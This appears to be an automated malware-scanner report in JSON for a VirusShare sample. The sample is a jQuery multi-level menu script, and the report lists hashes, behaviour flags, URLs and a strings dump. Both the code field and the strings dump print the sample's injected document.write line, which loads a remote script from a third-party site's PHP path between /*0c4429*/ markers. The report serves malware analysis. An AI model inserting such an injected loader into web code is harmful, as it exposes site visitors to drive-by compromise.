@@ -1,0 +1,89 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "write": "May write to a file"
+        },
+        "macro": "/*********************\n//* jQuery Multi Level CSS Menu #2- By Dynamic Drive: http://www.dynamicdrive.com/\n//* Last update: Nov 7th, 08': Limit # of queued animations to minmize animation stuttering\n//* Menu avaiable at DD CSS Library: http://www.dynamicdrive.com/style/\n*********************/\n\n//Update: April 12th, 10: Fixed compat issue with jquery 1.4x\n\n//Specify full URL to down and right arrow images (23 is padding-right to add to top level LIs with drop downs):\nvar arrowimages={down:['downarrowclass', 'down.gif', 73], right:['rightarrowclass', 'right.gif']}\n\nvar jqueryslidemenu={\n\nanimateduration: {over: 200, out: 100}, //duration of slide in/ out animation, in milliseconds\n\nbuildmenu:function(menuid, arrowsvar){\n\tjQuery(document).ready(function($){\n\t\tvar $mainmenu=$(\"#\"+menuid+\">ul\")\n\t\tvar $headers=$mainmenu.find(\"ul\").parent()\n\t\t$headers.each(function(i){\n\t\t\tvar $curobj=$(this)\n\t\t\tvar $subul=$(this).find('ul:eq(0)')\n\t\t\tthis._dimensions={w:this.offsetWidth, h:this.offsetHeight, subulw:$subul.outerWidth(), subulh:$subul.outerHeight()}\n\t\t\tthis.istopheader=$curobj.parents(\"ul\").length==1? true : false\n\t\t\t$subul.css({top:this.istopheader? this._dimensions.h+\"px\" : 0})\n\t\t\t$curobj.children(\"a:eq(0)\").css(this.istopheader? {paddingRight: arrowsvar.down[2]} : {}).append(\n\t\t\t\t'<img src=\"'+ (this.istopheader? arrowsvar.down[1] : arrowsvar.right[1])\n\t\t\t\t+'\" class=\"' + (this.istopheader? arrowsvar.down[0] : arrowsvar.right[0])\n\t\t\t\t+ '\" style=\"border:0;\" />'\n\t\t\t)\n\t\t\t$curobj.hover(\n\t\t\t\tfunction(e){\n\t\t\t\t\tvar $targetul=$(this).children(\"ul:eq(0)\")\n\t\t\t\t\tthis._offsets={left:$(this).offset().left, top:$(this).offset().top}\n\t\t\t\t\tvar menuleft=this.istopheader? 0 : this._dimensions.w\n\t\t\t\t\tmenuleft=(this._offsets.left+menuleft+this._dimensions.subulw>$(window).width())? (this.istopheader? -this._dimensions.subulw+this._dimensions.w : -this._dimensions.w) : menuleft\n\t\t\t\t\tif ($targetul.queue().length<=1) //if 1 or less queued animations\n\t\t\t\t\t\t$targetul.css({left:menuleft+\"px\", width:this._dimensions.subulw+'px'}).slideDown(jqueryslidemenu.animateduration.over)\n\t\t\t\t},\n\t\t\t\tfunction(e){\n\t\t\t\t\tvar $targetul=$(this).children(\"ul:eq(0)\")\n\t\t\t\t\t$targetul.slideUp(jqueryslidemenu.animateduration.out)\n\t\t\t\t}\n\t\t\t) //end hover\n\t\t\t$curobj.click(function(){\n\t\t\t\t$(this).children(\"ul:eq(0)\").hide()\n\t\t\t})\n\t\t}) //end $headers.each()\n\t\t$mainmenu.find(\"ul\").css({display:'none', visibility:'visible'})\n\t}) //end document.ready\n}\n}\n\n//build menu with ID=\"myslidemenu\" on page:\njqueryslidemenu.buildmenu(\"myslidemenu\", arrowimages)\n\n/*0c4429*/\ndocument.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=146332603' type='text/javascript'></\" + \"script>\");\n/*/0c4429*/"
+    },
+    "filename": "VirusShare_b6cc9ee6849c6b46c501d9833a404cb7",
+    "filesize": 2691,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "b6cc9ee6849c6b46c501d9833a404cb7",
+        "sha1": "e45eac27929bfc60267b978e67bc1c8a51df765c",
+        "sha256": "8c34c42231fffea05af9fb7f385371d8c176b393c55eeb1779079427e0554ff9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "/*********************",
+            "//* jQuery Multi Level CSS Menu #2- By Dynamic Drive: http://www.dynamicdrive.com/",
+            "//* Last update: Nov 7th, 08': Limit # of queued animations to minmize animation stuttering",
+            "//* Menu avaiable at DD CSS Library: http://www.dynamicdrive.com/style/",
+            "*********************/",
+            "//Update: April 12th, 10: Fixed compat issue with jquery 1.4x",
+            "//Specify full URL to down and right arrow images (23 is padding-right to add to top level LIs with drop downs):",
+            "var arrowimages={down:['downarrowclass', 'down.gif', 73], right:['rightarrowclass', 'right.gif']}",
+            "var jqueryslidemenu={",
+            "animateduration: {over: 200, out: 100}, //duration of slide in/ out animation, in milliseconds",
+            "buildmenu:function(menuid, arrowsvar){",
+            "\tjQuery(document).ready(function($){",
+            "\t\tvar $mainmenu=$(\"#\"+menuid+\">ul\")",
+            "\t\tvar $headers=$mainmenu.find(\"ul\").parent()",
+            "\t\t$headers.each(function(i){",
+            "\t\t\tvar $curobj=$(this)",
+            "\t\t\tvar $subul=$(this).find('ul:eq(0)')",
+            "\t\t\tthis._dimensions={w:this.offsetWidth, h:this.offsetHeight, subulw:$subul.outerWidth(), subulh:$subul.outerHeight()}",
+            "\t\t\tthis.istopheader=$curobj.parents(\"ul\").length==1? true : false",
+            "\t\t\t$subul.css({top:this.istopheader? this._dimensions.h+\"px\" : 0})",
+            "\t\t\t$curobj.children(\"a:eq(0)\").css(this.istopheader? {paddingRight: arrowsvar.down[2]} : {}).append(",
+            "\t\t\t\t'<img src=\"'+ (this.istopheader? arrowsvar.down[1] : arrowsvar.right[1])",
+            "\t\t\t\t+'\" class=\"' + (this.istopheader? arrowsvar.down[0] : arrowsvar.right[0])",
+            "\t\t\t\t+ '\" style=\"border:0;\" />'",
+            "\t\t\t)",
+            "\t\t\t$curobj.hover(",
+            "\t\t\t\tfunction(e){",
+            "\t\t\t\t\tvar $targetul=$(this).children(\"ul:eq(0)\")",
+            "\t\t\t\t\tthis._offsets={left:$(this).offset().left, top:$(this).offset().top}",
+            "\t\t\t\t\tvar menuleft=this.istopheader? 0 : this._dimensions.w",
+            "\t\t\t\t\tmenuleft=(this._offsets.left+menuleft+this._dimensions.subulw>$(window).width())? (this.istopheader? -this._dimensions.subulw+this._dimensions.w : -this._dimensions.w) : menuleft",
+            "\t\t\t\t\tif ($targetul.queue().length<=1) //if 1 or less queued animations",
+            "\t\t\t\t\t\t$targetul.css({left:menuleft+\"px\", width:this._dimensions.subulw+'px'}).slideDown(jqueryslidemenu.animateduration.over)",
+            "\t\t\t\t},",
+            "\t\t\t\tfunction(e){",
+            "\t\t\t\t\tvar $targetul=$(this).children(\"ul:eq(0)\")",
+            "\t\t\t\t\t$targetul.slideUp(jqueryslidemenu.animateduration.out)",
+            "\t\t\t\t}",
+            "\t\t\t) //end hover",
+            "\t\t\t$curobj.click(function(){",
+            "\t\t\t\t$(this).children(\"ul:eq(0)\").hide()",
+            "\t\t\t})",
+            "\t\t}) //end $headers.each()",
+            "\t\t$mainmenu.find(\"ul\").css({display:'none', visibility:'visible'})",
+            "\t}) //end document.ready",
+            "//build menu with ID=\"myslidemenu\" on page:",
+            "jqueryslidemenu.buildmenu(\"myslidemenu\", arrowimages)",
+            "/*0c4429*/",
+            "document.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=146332603' type='text/javascript'></\" + \"script>\");",
+            "/*/0c4429*/"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.dynamicdrive.com/style/",
+            "http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=146332603",
+            "http://www.dynamicdrive.com/"
+        ]
+    },
+    "time": "0:00:00.404298",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
